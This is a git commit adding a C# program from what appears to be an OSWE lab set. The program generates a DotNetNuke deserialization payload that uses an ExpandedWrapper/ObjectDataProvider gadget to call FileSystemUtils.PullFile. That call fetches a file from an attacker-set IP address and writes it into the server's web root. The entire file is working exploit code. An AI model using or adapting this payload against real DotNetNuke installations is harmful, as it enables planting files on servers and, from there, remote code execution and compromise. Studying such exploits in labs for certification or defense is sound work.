5cdc56a6f9dbbbc8242c44d7dda95187f864b5bf
Soliman Al-mansor <166959960+solimanalmansor@users.noreply.github.com>
2025-07-19 18:20:29 +0300

    Create ExpWrapSerializer.cs

---
+++ OSWE-Labs/DotNetNuke/ExpWrapSerializer.cs
@@ -0,0 +1,37 @@
+using System;
+using System.IO;
+using DotNetNuke.Common.Utilities;
+using System.Collections;
+using System.Data.Services.Internal;
+using System.Windows.Data;
+
+namespace ExpWrapSerializer
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Serialize();
+        }
+        public static void Serialize()
+        {
+            ExpandedWrapper<FileSystemUtils, ObjectDataProvider> myExpWrap = new ExpandedWrapper<FileSystemUtils, ObjectDataProvider>();
+            myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
+            myExpWrap.ProjectedProperty0.ObjectInstance = new FileSystemUtils();
+            myExpWrap.ProjectedProperty0.MethodName = "PullFile";
+            myExpWrap.ProjectedProperty0.MethodParameters.Add("http://192.168.119.7/myODPTest.txt"); // change the IP 
+            myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
+
+
+            Hashtable table = new Hashtable();
+            table["myTableEntry"] = myExpWrap;
+            String payload = XmlUtils.SerializeDictionary(table, "profile");
+            TextWriter writer = new StreamWriter("C:\\Users\\Public\\ExpWrap.txt");
+            writer.Write(payload);
+            writer.Close();
+
+            Console.WriteLine("Done!");
+        }
+
+    }
+}
